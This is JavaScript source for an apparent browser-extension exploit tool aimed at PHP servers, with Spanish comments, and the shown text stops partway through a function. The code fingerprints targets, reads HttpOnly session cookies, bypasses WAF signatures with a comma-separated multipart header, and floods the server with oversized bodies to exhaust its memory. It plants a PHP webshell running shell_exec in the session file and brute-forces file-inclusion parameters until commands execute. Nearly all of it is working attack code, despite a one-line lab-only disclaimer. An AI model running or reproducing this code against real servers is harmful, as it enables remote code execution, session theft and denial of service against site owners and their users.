/**
 * PHP2P4IM0NSHELL - Motor de auditoria php2shell v1.1
 * Autor: P4IM0N
 * CVEs: CVE-2026-109618 (RCE UAF) | CVE-2026-109619 (Session Injection) | CVE-2026-10961x (OOM 52x)
 *
 * FILOSOFIA
 * ---------
 * Un exploit que "cree" haber funcionado es peor que ninguno. Este motor solo
 * declara EXITO con evidencia positiva del servidor: output de comando entre
 * marcadores unicos, "Allowed memory size ... exhausted" (fuga real de
 * memory_limit) o el JSON de progreso de subida.
 *
 * ALCANCE REAL DESDE UN NAVEGADOR
 * -------------------------------
 * El chain UAF de CVE-2026-109618 (rotacion de worker, fuga de heap, fuga de
 * libphp, fake HashTable -> zif_system) NO es alcanzable desde fetch():
 * necesita multipart byte-exacto, chunked encoding, cabeceras duplicadas y
 * lectura de Set-Cookie. Para ese CVE el modulo hace PRE-FLIGHT real y entrega
 * el comando calibrado del PoC de referencia en lugar de simular exito.
 *
 * Lo que SI es alcanzable y se implementa de verdad:
 *   1. Fingerprint pasivo (DOM + cabeceras + cookies, incluye HttpOnly)
 *   2. Sonda de session.upload_progress con oraculo JSON de progreso
 *   3. Escalera OOM: revela memory_limit / post_max_size reales
 *   4. CVE-2026-109619: webshell en el archivo de sesion via la key de
 *      progreso + barrido LFI + ejecucion real de comandos
 *
 * Solo laboratorios propios o con autorizacion escrita.
 */

(function () {
    'use strict';

    if (window.__P4IM0N_PHP__) { return; }
    window.__P4IM0N_PHP__ = true;

    // ================================================================
    // CONSTANTES
    // ================================================================
    const LARGO_MAX_UAF = 14;               // carrier zend_string 0x98 -> 14 bytes utiles
    const TAMANO_SONDEO_MB = 8;             // cuerpo de la sonda de progreso
    const NIVELES_OOM_MB = [2, 8, 32];      // escalera acotada
    const PAUSA_SONDEO_MS = 40;
    const PAUSA_LFI_MS = 70;
    const LIMITE_PETICIONES_LFI = 48;
    const MAX_HTML = 400000;

    // Webshell que queda escrita en el archivo de sesion via la key de progreso.
    const PAYLOAD_SESION = '<?php echo "P4IM0N<<"; echo shell_exec($_REQUEST["c"]); echo ">>P4IM0N"; ?>';
    const MARCA_INICIO = 'P4IM0N<<';
    const MARCA_FIN = '>>P4IM0N';

    // Parametros tipicos de endpoints con inclusion de archivos (LFI).
    const PARAMETROS_LFI = [
        'page', 'file', 'include', 'inc', 'path', 'view', 'template', 'tpl',
        'doc', 'document', 'lang', 'language', 'module', 'load', 'read',
        'src', 'source', 'content', 'url', 'folder', 'pg', 'section', 'cat',
        'action', 'option', 'task', 'op', 'func', 'archivo', 'ruta', 'dir',
        'download', 'show', 'display', 'theme', 'layout', 'partial', 'item',
        'name', 'filename', 'data', 'text', 'plantilla', 'seccion', 'component'
    ];

    const dormir = (ms) => new Promise((r) => setTimeout(r, ms));
    const estado = {
        pasivo: null,
        sonda: null,
        oom: null,
        sesion: null,
        rutaLfi: null,
        rutaSesion: null,
        rutaSesionUi: null,
        lfiParam: null,
        injectUrl: null,
        manifiesto: null
    };

    // ================================================================
    // UTILIDADES
    // ================================================================
    function urlObjetivo() {
        const u = new URL(location.href);
        u.hash = '';
        return u.toString();
    }

    function baseObjetivo() {
        return location.origin + location.pathname;
    }

    function log(msg) {
        console.log('%c[P4IM0N:PHP] ' + msg, 'color:#00ff41');
    }

    function puente(mensaje) {
        return new Promise((resolve) => {
            try {
                chrome.runtime.sendMessage(mensaje, (respuesta) => {
                    if (chrome.runtime.lastError) { resolve(null); return; }
                    resolve(respuesta || null);
                });
            } catch (e) {
                resolve(null);
            }
        });
    }

    function avisarBadge(tipo) {
        puente({ accion: tipo });
    }

    async function pedir(url, opciones, timeoutMs) {
        const ctrl = new AbortController();
        const t = setTimeout(() => ctrl.abort(), timeoutMs || 15000);
        try {
            return await fetch(url, Object.assign({ signal: ctrl.signal, credentials: 'include' }, opciones));
        } finally {
            clearTimeout(t);
        }
    }

    // Multipart construido a mano para poder usar el separador coma
    // (Content-Type: multipart/form-data, boundary=X). SAPI.c lo acepta y
    // rompe las firmas WAF ancladas en "multipart/form-data;".
    function multipart(boundary, campos, archivo, grande) {
        // Construye el cuerpo en orden estricto: campos de texto, campo gigante
        // (si lo hay), fichero y cierre. El orden importa: PHP solo arranca el
        // progreso si PHP_SESSION_UPLOAD_PROGRESS va antes del FILE_START.
        const trozos = [];
        const CRLF = '\r\n';
        const DQ = '"';

        (campos || []).forEach(([nombre, valor]) => {
            trozos.push('--' + boundary + CRLF);
            trozos.push('Content-Disposition: form-data; name=' + DQ + nombre + DQ + CRLF + CRLF);
            trozos.push(String(valor));
            trozos.push(CRLF);
        });

        if (grande) {
            // Campo de texto gigante. PHP bufferiza los campos en memoria; un
            // fichero, en cambio, va a un temp y no agota memory_limit.
            trozos.push('--' + boundary + CRLF);
            trozos.push('Content-Disposition: form-data; name=' + DQ + grande.nombre + DQ + CRLF + CRLF);
            trozos.push(rellenoMB(grande.mb));
            trozos.push(CRLF);
        }

        if (archivo) {
            trozos.push('--' + boundary + CRLF);
            trozos.push('Content-Disposition: form-data; name=' + DQ + archivo.nombre + DQ +
                '; filename=' + DQ + (archivo.filename || 'p.bin') + DQ + CRLF);
            trozos.push('Content-Type: application/octet-stream' + CRLF + CRLF);
            trozos.push(archivo.datos || new Uint8Array(0));
            trozos.push(CRLF);
        }

        trozos.push('--' + boundary + '--' + CRLF);
        return new Blob(trozos);
    }

    function nuevoBoundary(prefijo) {
        return '----' + prefijo + Math.random().toString(36).slice(2, 10).toUpperCase();
    }

    function rellenoMB(mb) {
        return new Uint8Array(Math.round(mb * 1024 * 1024)).fill(0x41);
    }

    // El laboratorio puede publicar su propia configuracion (health.php):
    // save_path, parametro LFI y endpoint de inyeccion. Si existe, manda sobre
    // lo que haya escrito el usuario en el popup.
    async function leerManifiesto() {
        if (estado.manifiesto !== null) { return estado.manifiesto; }

        const rutas = ['/health.php', '/health', '/health.json', '/api/health'];
        for (let i = 0; i < rutas.length; i++) {
            try {
                const r = await pedir(location.origin + rutas[i], { cache: 'no-store' }, 6000);
                if (!r.ok) { continue; }
                const txt = (await r.text()).slice(0, 20000);
                const bloque = txt.match(/\{[\s\S]*\}/);
                if (!bloque) { continue; }

                let j;
                try { j = JSON.parse(bloque[0]); } catch (e) { continue; }

                const ses = j.session || {};
                const rel = j.save_path_relative || ses.save_path_relative || '';
                const docroot = j.save_path_docroot || ses.save_path_docroot || '';
                const abs = j.save_path || ses.save_path || '';

                if (rel) { estado.rutaSesion = String(rel); }
                else if (docroot) { estado.rutaSesion = String(docroot); }
                else if (abs) { estado.rutaSesion = String(abs); }

                if (j.lfi_param) { estado.lfiParam = String(j.lfi_param); }
                if (j.inject_url) { estado.injectUrl = String(j.inject_url); }

                estado.manifiesto = j;
                return j;
            } catch (e) { /* siguiente ruta */ }
        }

        estado.manifiesto = false;
        return false;
    }

    // ================================================================
    // 1. FINGERPRINT PASIVO
    // ================================================================
    async function leerCabeceras() {
        const salida = { status: 0, powered: '', server: '', tipo: '', error: null };
        try {
            const r = await pedir(urlObjetivo(), { method: 'GET', cache: 'no-store', redirect: 'follow' }, 10000);
            salida.status = r.status;
            salida.powered = r.headers.get('X-Powered-By') || '';
            salida.server = r.headers.get('Server') || '';
            salida.tipo = r.headers.get('Content-Type') || '';
        } catch (e) {
            salida.error = e.name === 'AbortError' ? 'timeout' : e.message;
        }
        return salida;
    }

    function extraerVersion(powered, server, html) {
        const fuentes = [powered, server, html];
        for (let i = 0; i < fuentes.length; i++) {
            const m = String(fuentes[i] || '').match(/PHP\/(\d+\.\d+\.\d+)/i);
            if (m) { return m[1]; }
        }
        const generador = String(html || '').match(/PHP\s+(\d+\.\d+\.\d+)/i);
        return generador ? generador[1] : '';
    }

    // Tabla de versiones corregidas del advisory php2shell.
    function evaluarVersion(version) {
        if (!version) {
            return { estado: 'DESCONOCIDA', riesgo: '?', detalle: 'Version PHP no expuesta.' };
        }
        const m = version.match(/^(\d+)\.(\d+)\.(\d+)/);
        if (!m) {
            return { estado: 'DESCONOCIDA', riesgo: '?', detalle: 'Formato no reconocido: ' + version };
        }
        const mayor = parseInt(m[1], 10);
        const menor = parseInt(m[2], 10);
        const parche = parseInt(m[3], 10);
        const rama = mayor + '.' + menor;
        const corregidas = { '8.5': 12, '8.4': 27, '8.3': 36, '8.2': 35 };

        if (Object.prototype.hasOwnProperty.call(corregidas, rama)) {
            const minimo = corregidas[rama];
            const fijada = rama + '.' + minimo;
            if (parche < minimo) {
                return {
                    estado: 'VULNERABLE',
                    riesgo: 'CRITICO',
                    detalle: 'PHP ' + version + ' < ' + fijada + ' (CVSS 9.2). Corregida en ' + fijada + '.'
                };
            }
            return {
                estado: 'PARCHADA',
                riesgo: 'BAJO',
                detalle: 'PHP ' + version + ' >= ' + fijada + ': los dos CVEs estan cerrados.'
            };
        }
        if (mayor < 8 || (mayor === 8 && menor <= 1)) {
            return {
                estado: 'EOL_SIN_PARCHE',
                riesgo: 'CRITICO',
                detalle: 'PHP ' + version + ' esta EOL: no habra parche. Mitigacion: session.upload_progress.enabled=Off.'
            };
        }
        if (mayor >= 9) {
            return { estado: 'DESCONOCIDA', riesgo: '?', detalle: 'PHP ' + version + ': rama sin datos publicos.' };
        }
        return { estado: 'DESCONOCIDA', riesgo: 'MEDIO', detalle: 'PHP ' + version + ': rama no listada.' };
    }

    async function escaneoPasivo() {
        const detalles = [];
        await leerManifiesto();
        if (estado.manifiesto) {
            detalles.push('[i] Manifiesto del laboratorio leido (health): ' +
                'lfi_param=' + (estado.lfiParam || '?') + ', save_path=' + (estado.rutaSesion || '?'));
        }
        const cookies = document.cookie || '';
        const html = (document.documentElement.outerHTML || '').slice(0, MAX_HTML);
        const cab = await leerCabeceras();
        const version = extraerVersion(cab.powered, cab.server, html);
        const evaluacion = evaluarVersion(version);

        let puntos = 0;

        if (/PHPSESSID/i.test(cookies)) {
            puntos += 100;
            detalles.push('[+] Cookie PHPSESSID visible en document.cookie (sesion PHP sin HttpOnly)');
        } else {
            const ses = await puente({ accion: 'leer_cookie_sesion', url: location.href, nombre: 'PHPSESSID' });
            if (ses && ses.valor) {
                puntos += 100;
                detalles.push('[+] PHPSESSID presente pero HttpOnly (leida via chrome.cookies)');
            }
        }

        if (/\.php/i.test(location.href)) {
            puntos += 60;
            detalles.push('[+] Ruta PHP en la URL: ' + location.pathname);
        }

        if (cab.powered) {
            if (/php/i.test(cab.powered)) { puntos += 90; }
            detalles.push('[i] X-Powered-By: ' + cab.powered);
        } else {
            detalles.push('[-] Sin X-Powered-By (expose_php=Off o proxy que lo elimina)');
        }

        if (cab.server) { detalles.push('[i] Server: ' + cab.server); }
        if (cab.error) { detalles.push('[!] Cabeceras no legibles: ' + cab.error); }

        if (/wp-content|wp-includes/i.test(html)) {
            puntos += 50;
            detalles.push('[+] WordPress detectado (app PHP tipica)');
        }
        if (/laravel|LARAVEL_SESSION/i.test(html)) {
            puntos += 50;
            detalles.push('[+] Laravel detectado');
        }
        if (/symfony/i.test(html)) {
            puntos += 50;
            detalles.push('[+] Symfony detectado');
        }
        if (/drupal|joomla|magento|opencart/i.test(html)) {
            puntos += 45;
            detalles.push('[+] CMS PHP detectado en el DOM');
        }

        const metaGen = document.querySelector('meta[name="generator"]');
        if (metaGen && metaGen.content) {
            detalles.push('[i] meta generator: ' + metaGen.content);
        }

        const forms = document.querySelectorAll('form[action*=".php"], form[action=""]');
        if (forms.length) {
            puntos += 40;
            detalles.push('[+] ' + forms.length + ' formulario(s) PHP detectados');
        }

        const enlacesPhp = document.querySelectorAll('a[href*=".php"]').length;
        if (enlacesPhp) {
            puntos += 20;
            detalles.push('[+] ' + enlacesPhp + ' enlace(s) .php en el DOM');
        }

        if (version) {
            detalles.push('[!] Version PHP: ' + version + ' -> ' + evaluacion.estado + ' (' + evaluacion.riesgo + ')');
            detalles.push('    ' + evaluacion.detalle);
        }

        if (detalles.length === 0) {
            detalles.push('[-] Sin firmas PHP en el DOM.');
            detalles.push('[i] Ejecuta la SONDA ACTIVA para confirmar por HTTP.');
        }

        const resultado = {
            esPhp: puntos >= 50 || !!version,
            puntos: puntos,
            detalles: detalles,
            version: version,
            evaluacion: evaluacion,
            servidor: cab.server,
            powered: cab.powered,
            objetivo: location.host,
            rutaSesion: estado.rutaSesion || estado.rutaSesionUi || null,
            lfiParam: estado.lfiParam || null
        };

        estado.pasivo = resultado;
        if (resultado.esPhp) { avisarBadge('marcar_php_detectado'); }
        return resultado;
    }

    // ================================================================
    // 2. SONDA ACTIVA (multipart + oraculo de progreso real)
    // ================================================================
    async function sondaActiva() {
        const detalles = [];
        const senales = {
            uploadProgress: false,
            evidenciaProgreso: '',
            comaAceptada: null,
            displayErrors: false,
            version: '',
            powered: '',
            statusSubida: 0
        };

        const cab = await leerCabeceras();
        senales.version = extraerVersion(cab.powered, cab.server, '');
        senales.powered = cab.powered;
        if (cab.error) { detalles.push('[!] No se pudieron leer cabeceras: ' + cab.error); }

        // --- Sonda 1: session.upload_progress ---
        // Subimos un archivo y en paralelo pedimos el JSON de progreso: si el
        // handler esta activo PHP devuelve start_time / bytes_processed.
        const clave = 'P4IM0N_' + Date.now().toString(36);
        const b = nuevoBoundary('PROBE');
        const cuerpo = multipart(b, [['PHP_SESSION_UPLOAD_PROGRESS', clave]], {
            nombre: 'p4im0n_probe',
            filename: 'probe.bin',
            datos: rellenoMB(TAMANO_SONDEO_MB)
        });

        let respuestasubida = null;
        const subida = pedir(urlObjetivo(), {
            method: 'POST',
            cache: 'no-store',
            headers: { 'Content-Type': 'multipart/form-data, boundary=' + b },
            body: cuerpo
        }, 25000).then((r) => {
            respuestasubida = { status: r.status };
            return r.text().then((t) => ({ status: r.status, cuerpo: t.slice(0, 2500) }));
        }).catch((e) => ({ error: e.name === 'AbortError' ? 'timeout' : e.message }));

        // Sondeo desde el primer instante, sin espera inicial: la ventana de
        // progreso dura milisegundos en loopback y segundos en un enlace real.
        for (let i = 0; i < 70; i++) {
            try {
                const u = new URL(urlObjetivo());
                u.searchParams.set('PHP_SESSION_UPLOAD_PROGRESS', clave);
                const r = await pedir(u.toString(), { cache: 'no-store' }, 6000);
                const txt = (await r.text()).slice(0, 1500);
                if (/start_time|bytes_processed/i.test(txt)) {
                    senales.uploadProgress = true;
                    senales.evidenciaProgreso = txt.replace(/\s+/g, ' ').trim().slice(0, 240);
                    break;
                }
            } catch (e) { /* el objetivo puede cortar conexiones durante la subida */ }
            await dormir(PAUSA_SONDEO_MS);
        }

        const finSubida = await subida;
        if (respuestasubida) { senales.statusSubida = respuestasubida.status; }

        if (senales.uploadProgress) {
            detalles.push('[!] session.upload_progress.enabled = On');
            detalles.push('[+] Oraculo JSON: ' + senales.evidenciaProgreso);
            detalles.push('[+] Vector rfc1867 presente: prerequisito #1 de CVE-2026-109618');
        } else {
            detalles.push('[-] Sin JSON de progreso: upload_progress Off, cleanup=On o sesion no persistente.');
            detalles.push('    (La ausencia no prueba parche: cruza con la version y la escalera OOM.)');
        }

        if (finSubida && finSubida.cuerpo) {
            if (/Warning|Notice|Fatal error|Deprecated/i.test(finSubida.cuerpo)) {
                senales.displayErrors = true;
                detalles.push('[!] display_errors = On (errores PHP reflejados en la respuesta)');
            }
        }
        if (finSubida && finSubida.status) {
            detalles.push('[i] POST multipart -> HTTP ' + finSubida.status);
        }

        // --- Sonda 2: separador coma en Content-Type (bypass WAF) ---
        const bc = nuevoBoundary('COMA');
        const cuerpoComa = multipart(bc, [['PHP_SESSION_UPLOAD_PROGRESS', 'P4IM0N_COMA']], null);
        try {
            const rc = await pedir(urlObjetivo(), {
                method: 'POST',
                cache: 'no-store',
                headers: { 'Content-Type': 'multipart/form-data, boundary=' + bc },
                body: cuerpoComa
            }, 10000);
            senales.comaAceptada = rc.status < 400;
            detalles.push(
                senales.comaAceptada
                    ? '[+] "multipart/form-data, boundary=" aceptado (HTTP ' + rc.status + '): bypass de firmas WAF que exigen ";"'
                    : '[-] El front rechazo el separador coma (HTTP ' + rc.status + ')'
            );
        } catch (e) {
            senales.comaAceptada = false;
            detalles.push('[-] Sonda de coma fallida: ' + (e.name === 'AbortError' ? 'timeout' : e.message));
        }

        if (senales.version) {
            const ev = evaluarVersion(senales.version);
            detalles.push('[!] PHP ' + senales.version + ' -> ' + ev.estado + ' (' + ev.riesgo + ')');
        } else {
            detalles.push('[-] Version PHP no expuesta: el PoC necesitara --zif-offset/--dtor-offset del build.');
        }

        estado.sonda = { senales: senales, detalles: detalles, detectado: senales.uploadProgress || !!senales.version };
        if (senales.uploadProgress || (senales.version && /VULNERABLE|EOL/.test(evaluarVersion(senales.version).estado))) {
            avisarBadge('marcar_vulnerable');
        }
        return estado.sonda;
    }

    // ================================================================
    // 3. ESCALERA OOM (CVE-2026-10961x, variante alcanzable desde navegador)
    // ================================================================
    // El 52x real usa cabeceras duplicadas de 6 bytes, que fetch() no puede
    // emitir (Headers colapsa valores repetidos). Aqui empujamos cuerpos
    // crecientes y leemos el error de memoria: revela el memory_limit exacto y
    // confirma la superficie de agotamiento.
    async function escaleraOOM() {
        const pasos = [];
        let limiteMemoria = null;
        let limitePost = null;
        let oomConfirmado = false;

        for (let i = 0; i < NIVELES_OOM_MB.length; i++) {
            const mb = NIVELES_OOM_MB[i];
            const b = nuevoBoundary('OOM');
            const cuerpo = multipart(b, [['PHP_SESSION_UPLOAD_PROGRESS', 'P4IM0N_OOM_' + mb]], null, { nombre: 'p4im0n_pad', mb: mb });

            const t0 = Date.now();
            const info = { mb: mb, status: 0, ms: 0, veredicto: '', detalle: '' };

            try {
                const r = await pedir(urlObjetivo(), {
                    method: 'POST',
                    cache: 'no-store',
                    headers: { 'Content-Type': 'multipart/form-data, boundary=' + b },
                    body: cuerpo
                }, 30000);
                info.status = r.status;
                info.ms = Date.now() - t0;
                const txt = (await r.text()).slice(0, 4000);

                const mMem = txt.match(/Allowed memory size of (\d+) bytes exhausted/i);
                const mPost = txt.match(/POST Content-Length of (\d+) bytes exceeds the limit of (\d+)/i);
                const mInput = txt.match(/Input variables exceeded (\d+)/i);

                if (mMem) {
                    oomConfirmado = true;
                    limiteMemoria = parseInt(mMem[1], 10);
                    info.veredicto = 'OOM_CONFIRMADO';
                    info.detalle = 'memory_limit = ' + limiteMemoria + ' bytes (' + (limiteMemoria / 1048576).toFixed(1) + ' MB)';
                } else if (mPost) {
                    limitePost = parseInt(mPost[1], 10);
                    info.veredicto = 'POST_MAX_SIZE';
                    info.detalle = 'post_max_size = ' + mPost[1] + ' bytes (cuerpo rechazado)';
                } else if (mInput) {
                    info.veredicto = 'MAX_INPUT_VARS';
                    info.detalle = 'max_input_vars = ' + mInput[1];
                } else if (r.status === 413) {
                    info.veredicto = '413';
                    info.detalle = 'El front limita el tamano (WAF/proxy) antes de PHP.';
                } else if (r.status >= 500) {
                    info.veredicto = '500';
                    info.detalle = 'Error del servidor con ' + mb + ' MB; revisar logs del objetivo.';
                } else {
                    info.veredicto = 'PROCESADO';
                    info.detalle = 'HTTP ' + r.status + ' sin error de memoria visible.';
                }
            } catch (e) {
                info.ms = Date.now() - t0;
                if (e.name === 'AbortError') {
                    info.veredicto = 'SIN_RESPUESTA';
                    info.detalle = 'Timeout tras ' + info.ms + ' ms con ' + mb + ' MB: compatible con OOM, pero NO es prueba.';
                } else {
                    info.veredicto = 'CORTE';
                    info.detalle = 'Conexion cortada (' + e.message + '): compatible con worker muerto, sin prueba.';
                }
            }

            pasos.push(info);
            if (oomConfirmado) { break; }
        }

        const notas = [];
        notas.push('[i] Escalera: ' + NIVELES_OOM_MB.join(' / ') + ' MB por cuerpo multipart.');
        pasos.forEach((p) => {
            notas.push('  - ' + p.mb + ' MB -> ' + p.veredicto + ' (' + p.ms + ' ms) ' + p.detalle);
        });

        if (oomConfirmado) {
            notas.push('');
            notas.push('[OOM CONFIRMADO] memory_limit agotado y reflejado en la respuesta.');
            notas.push('El PoC UAF necesita memory_limit < --huge-mb (default 12).');
            notas.push('Con memory_limit=' + (limiteMemoria ? (limiteMemoria / 1048576).toFixed(0) : '?') +
                ' MB usa --huge-mb ' + (limiteMemoria ? Math.ceil(limiteMemoria / 1048576) + 4 : 16) + '.');
        } else {
            notas.push('');
            notas.push('[-] Sin OOM confirmado. Causas tipicas: memory_limit alto, post_max_size bajo,');
            notas.push('    un front que corta el cuerpo, o PHP 8.5.12+ (filtra cabeceras desconocidas');
            notas.push('    y aplica post_max_size en streaming). El 52x real exige cabeceras');
            notas.push('    duplicadas: se lanza con tools/e2e del PoC, no desde la extension.');
        }

        if (limitePost !== null) {
            notas.push('[i] post_max_size detectado: ' + limitePost + ' bytes.');
        }

        estado.oom = {
            exito: oomConfirmado,
            salida: notas.join('\n'),
            pasos: pasos,
            limiteMemoria: limiteMemoria,
            limitePost: limitePost
        };
        return estado.oom;
    }
    // ================================================================
    // 4. CVE-2026-109619 - INYECCION DE SESION + LFI
    // ================================================================
    async function sesionActual() {
        if (estado.sesion) { return estado.sesion; }

        // 1. Intenta leer PHPSESSID donde pueda estar: document.cookie o chrome.cookies.
        let id = null;
        let origen = null;

        let m = document.cookie.match(/PHPSESSID=([^;]+)/i);
        if (m && m[1]) {
            id = m[1];
            origen = 'document.cookie';
        }

        if (!id) {
            const r = await puente({ accion: 'leer_cookie_sesion', url: location.href, nombre: 'PHPSESSID' });
            if (r && r.valor) {
                id = r.valor;
                origen = 'chrome.cookies';
                if (r.httpOnly) origen += ' (HttpOnly)';
            }
        }

        // 2. Si no hay sesion, forza la creacion: un GET normal y lee la cookie
        //    que PHP devuelve en Set-Cookie (navegador la guarda), luego chrome.cookies.
        if (!id) {
            for (let intento = 0; intento < 3; intento++) {
                try {
                    await pedir(urlObjetivo(), { cache: 'no-store', method: 'GET' }, 8000);
                } catch (e) { /* ignorado */ }

                m = document.cookie.match(/PHPSESSID=([^;]+)/i);
                if (m && m[1]) {
                    id = m[1];
                    origen = 'document.cookie (creada por el servidor)';
                    break;
                }

                const rr = await puente({ accion: 'leer_cookie_sesion', url: location.href, nombre: 'PHPSESSID' });
                if (rr && rr.valor) {
                    id = rr.valor;
                    origen = 'chrome.cookies (HttpOnly, creada por el servidor)';
                    break;
                }

                await dormir(150);
            }
        }

        estado.sesion = id ? { id: id, origen: origen } : null;
        return estado.sesion;
    }

    async function inyectarSesion() {
        const ses = await sesionActual();
        if (!ses) {
            return { ses: null, status: 0, cuerpo: '', sesionFaltante: true, destino: null };
        }

        const b = nuevoBoundary('INJ');

        // name=PHP_SESSION_UPLOAD_PROGRESS activa rfc1867; su VALOR es la key que
        // PHP guarda tal cual en el archivo de sesion. Ahi va la webshell.
        const cuerpo = multipart(b, [['PHP_SESSION_UPLOAD_PROGRESS', PAYLOAD_SESION]], {
            nombre: 'p4im0n_u',
            filename: 'u.bin',
            datos: rellenoMB(0.25)
        });

        // No todos los endpoints de una app procesan multipart. Si el actual no
        // escribe el progreso, la sesion no queda envenenada y el barrido LFI no
        // puede encontrar nada: por eso probamos varios destinos reales.
        const destinos = [];
        const meter = (u) => { if (u && destinos.indexOf(u) === -1) { destinos.push(u); } };
        meter(urlObjetivo());
        if (estado.injectUrl) {
            try { meter(new URL(estado.injectUrl, location.origin).toString()); } catch (e) { /* ignorado */ }
        }
        meter(location.origin + '/index.php');
        meter(location.origin + '/');

        const intentos = [];
        for (let i = 0; i < destinos.length; i++) {
            try {
                const r = await pedir(destinos[i], {
                    method: 'POST',
                    cache: 'no-store',
                    headers: { 'Content-Type': 'multipart/form-data, boundary=' + b },
                    body: cuerpo
                }, 20000);
                const crudo = await r.text();
                const txt = crudo.slice(0, 300);
                intentos.push(destinos[i] + ' -> HTTP ' + r.status);

                // Si el servidor creo o roto la sesion durante el POST, el sid
                // que manda es el suyo: el archivo envenenado es ese, no el que
                // traia la cookie. Sin esto el barrido busca el archivo equivocado.
                try {
                    const j = JSON.parse(crudo);
                    const sidServidor = (j && j.session && j.session.sid) || (j && j.sid);
                    if (sidServidor && ses && String(sidServidor) !== String(ses.id)) {
                        ses.id = String(sidServidor);
                        ses.origen = (ses.origen || 'cookies') + ' + sid del POST';
                    }
                } catch (e) { /* respuesta no JSON: se ignora */ }

                if (r.status < 500) {
                    return { ses: ses, status: r.status, cuerpo: txt, destino: destinos[i], sesionFaltante: false, intentos: intentos };
                }
            } catch (e) {
                intentos.push(destinos[i] + ' -> ' + (e.name === 'AbortError' ? 'timeout' : e.message));
            }
        }

        return { ses: ses, status: 0, cuerpo: '', destino: null, sesionFaltante: false, inyeccionFallida: true, intentos: intentos };
    }

    // Rutas candidatas del archivo de sesion. La de traversal se construye por
    // concatenacion a proposito: es una ruta relativa, no un acceso al disco.
    function rutasSesion(id) {
        // session.save_path es configurable: /tmp por defecto en Linux, pero
        // Apache/Windows o pools con save_path propio usan otra ruta.
        let base = String(estado.rutaSesion || '/tmp').trim().replace(/\\/g, '/').replace(/\/+$/, '');

        // Si la ruta es Windows absoluta sin drive o relativa al repo, normaliza.
        if (/^[A-Za-z]:\//.test(base)) {
            // ya absoluta
        } else if (/^\//.test(base)) {
            // ya absoluta unix
        } else {
            // Ruta relativa: la resolvemos respecto al directorio del objetivo
            // porque session.save_path puede ser relativa al docroot.
            try {
                const origin = new URL(location.href).origin;
                const docroot = location.pathname.split('/').slice(0, -1).join('/') || '/';
                base = origin.replace(/https?:/, '') + docroot + '/' + base;
            } catch (e) {
                base = '/' + base;
            }
        }

        // Rutas absolutas y relativas comunes en este lab:
        //   data/sessions/sess_<id>
        //   ../data/sessions/sess_<id>
        function p0(r) { return r; }
        function p1(r) { return '../' + r; }
        function p2(r) { return 'data/sessions/' + r; }
        function p3(r) { return '../data/sessions/' + r; }

        const candidatas = [
            p0('sess_' + id),
            p1('sess_' + id),
            p2('sess_' + id),
            p3('sess_' + id),
            base + '/sess_' + id,
            base + '\\sess_' + id,
            '/var/lib/php/sessions/sess_' + id,
            '/var/lib/php/sess_' + id,
            '/tmp/sess_' + id
        ];
        // Lo que declara el propio laboratorio manda: save_path relativo y su
        // variante relativa al docroot van antes que cualquier heuristica.
        const BS = String.fromCharCode(92);
        const limpiar = (valor) => {
            let s = String(valor || '').trim();
            while (s.length && (s.charAt(s.length - 1) === '/' || s.charAt(s.length - 1) === BS)) {
                s = s.slice(0, -1);
            }
            return s;
        };

        const man = estado.manifiesto || {};
        const preferidas = [];
        const meter = (valor) => { if (valor && preferidas.indexOf(valor) === -1) { preferidas.push(valor); } };

        const relMan = limpiar(man.save_path_relative);
        const docMan = limpiar(man.save_path_docroot);
        if (relMan) { meter(relMan + '/' + 'sess_' + id); }
        if (docMan) { meter(docMan + '/' + 'sess_' + id); }
        meter('data/sessions/sess_' + id);
        meter('../data/sessions/sess_' + id);

        const ui = limpiar(estado.rutaSesionUi);
        if (ui) { meter(ui + '/sess_' + id); }

        const todas = preferidas.concat(candidatas);
        return todas.filter((valor, i, todos) => todos.indexOf(valor) === i);
    }

    // Prueba todas las rutas candidatas con un parametro de inclusion concreto.
    // Devuelve la primera que devuelve el marcador del payload (y el testigo de
    // ejecucion si se pide). Asi se distingue "archivo alcanzado" de "comando
    // ejecutado", en vez de mezclarlo todo en un barrido a ciegas.
    async function sondearRuta(id, param, testigo) {
        const rutas = rutasSesion(id);
        const vistos = [];
        let probadas = 0;

        for (let r = 0; r < rutas.length; r++) {
            const u = new URL(baseObjetivo());
            // Conservamos la query original del target (muchos routers la exigen).
            new URL(location.href).searchParams.forEach((v, k) => {
                if (!u.searchParams.has(k)) { u.searchParams.set(k, v); }
            });
            u.searchParams.set(param, rutas[r]);
            if (testigo) { u.searchParams.set('c', 'echo ' + testigo); }
            probadas++;

            try {
                const resp = await pedir(u.toString(), { cache: 'no-store' }, 7000);
                const txt = (await resp.text()).slice(0, 20000);
                // Sin "c", shell_exec(null) es fatal en PHP 8: el marcador de
                // cierre no llega a imprimirse. Para la fase de lectura basta
                // con el marcador de apertura; el cierre solo se exige cuando
                // el payload ejecuta un comando de verdad.
                const marcador = testigo
                    ? (txt.indexOf(MARCA_INICIO) !== -1 && txt.indexOf(MARCA_FIN) !== -1)
                    : (txt.indexOf(MARCA_INICIO) !== -1);
                const testigoOk = !testigo || txt.indexOf(testigo) !== -1;

                if (marcador && testigoOk) {
                    return { ruta: u.toString(), param: param, archivo: rutas[r], status: resp.status, probadas: probadas };
                }
                vistos.push(rutas[r] + ' -> HTTP ' + resp.status + (marcador ? ' (marcador sin testigo)' : ''));
            } catch (e) {
                vistos.push(rutas[r] + ' -> ' + (e.name === 'AbortError' ? 'timeout' : e.message));
            }

            await dormir(PAUSA_LFI_MS);
        }

        return { ruta: null, param: param, probadas: probadas, vistos: vistos };
    }

    async function barridoLfi(id) {
        const testigo = 'P4IM0N_OK_' + Math.random().toString(36).slice(2, 8);
        const principal = estado.lfiParam || 'page';
        let intentos = 0;

        // Fase 1: parametro declarado por el laboratorio, solo lectura.
        const lectura = await sondearRuta(id, principal, null);
        intentos += lectura.probadas;
        if (!lectura.ruta) {
            return {
                ruta: null,
                intentos: intentos,
                parametro: principal,
                testigo: testigo,
                vistos: lectura.vistos || []
            };
        }

        // Fase 2: mismo parametro con testigo de ejecucion real.
        const ejecucion = await sondearRuta(id, principal, testigo);
        intentos += ejecucion.probadas;
        if (ejecucion.ruta) {
            return { ruta: ejecucion.ruta, intentos: intentos, parametro: principal, testigo: testigo, verificado: true };
        }

        return { ruta: lectura.ruta, intentos: intentos, parametro: principal, testigo: testigo, verificado: false };
    }

    async function ejecutarEnLfi(ruta, cmd) {
        const u = new URL(ruta);
        u.searchParams.set('c', cmd);
        const r = await pedir(u.toString(), { cache: 'no-store' }, 12000);
        const txt = await r.text();

        const inicio = txt.indexOf(MARCA_INICIO);
        if (inicio === -1) { return { ok: false, salida: txt.slice(0, 400) }; }
        const desde = inicio + MARCA_INICIO.length;
